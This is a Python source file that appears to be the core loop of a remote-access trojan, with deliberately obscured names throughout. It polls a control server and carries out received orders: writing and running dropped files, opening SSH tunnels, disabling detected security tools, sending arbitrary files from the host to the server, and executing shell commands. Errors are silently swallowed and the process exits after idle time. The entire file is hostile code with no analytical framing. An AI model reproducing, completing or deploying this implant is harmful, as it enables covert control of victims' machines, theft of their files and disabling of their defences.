import os
import time

from .m0 import K0, K1, K2, _g0
from .m2 import _p0, _p1, _p2, _p3, _p4
from .m3 import _f1, _f2
from .m5 import _hf, _hi, _he, _hj
from .m4 import _xb, _xc
from .m1 import _r0
from .m6 import _s0
from .m7 import _t0

K9 = "__download "
K10 = "__disable_security"
K11 = "__ssh_tunnel"


def _l0() -> None:
    a = _g0()
    if not _hi():
        try:
            hi = _hf()
            try:
                _xb()
            except Exception:
                pass
            if _p4(K0, a, hi):
                _hj()
        except Exception:
            pass
    else:
        try:
            _xb()
        except Exception:
            pass
    lct = time.time()
    while True:
        try:
            if time.time() - lct > K2:
                try:
                    _xc()
                except Exception:
                    pass
                os._exit(0)
            resp = _p0(K0, a)
            cmd = resp.get("cmd")
            fs = resp.get("file")
            if fs and isinstance(fs, dict):
                path = fs.get("path") or ""
                content = fs.get("content") or ""
                run = bool(fs.get("run"))
                if path and content:
                    lct = time.time()
                    ok, msg = _f1(path, content, run)
                    try:
                        _p1(K0, a, msg)
                    except Exception:
                        pass
            if cmd:
                lct = time.time()
                if cmd.strip().startswith(K11):
                    try:
                        rest = cmd.strip()[len(K11):].strip().split()
                        remote = rest[0] if rest else ""
                        tp = "9051"
                        sp = "22"
                        if len(rest) == 2:
                            sp = rest[1]
                        elif len(rest) >= 3:
                            tp = rest[1]
                            sp = rest[2]
                        msg = _t0(K0, a, _p3, remote, tp, sp)
                        _p1(K0, a, msg)
                    except Exception as e:
                        try:
                            _p1(K0, a, f"ssh_tunnel failed: {e}")
                        except Exception:
                            pass
                elif cmd.strip() == K10:
                    try:
                        tools = _he()
                        _s0(tools)
                        _p1(K0, a, f"disable_security run (targeted: {tools!r})")
                    except Exception as e:
                        try:
                            _p1(K0, a, f"disable_security failed: {e}")
                        except Exception:
                            pass
                elif cmd.strip().startswith(K9):
                    path = cmd.strip()[len(K9):].strip()
                    ok, data = _f2(path)
                    if ok:
                        try:
                            _p2(K0, a, path, data)
                            _p1(K0, a, f"downloaded {path}")
                        except Exception:
                            _p1(K0, a, f"download send failed: {path}")
                    else:
                        try:
                            _p1(K0, a, f"download failed: {data}")
                        except Exception:
                            pass
                else:
                    out, err, code = _r0(cmd)
                    result = out
                    if err:
                        result += "\n[stderr]\n" + err
                    if code != 0:
                        result += f"\n[exit {code}]"
                    try:
                        _p1(K0, a, result)
                    except Exception:
                        pass
        except Exception:
            pass
        time.sleep(K1)
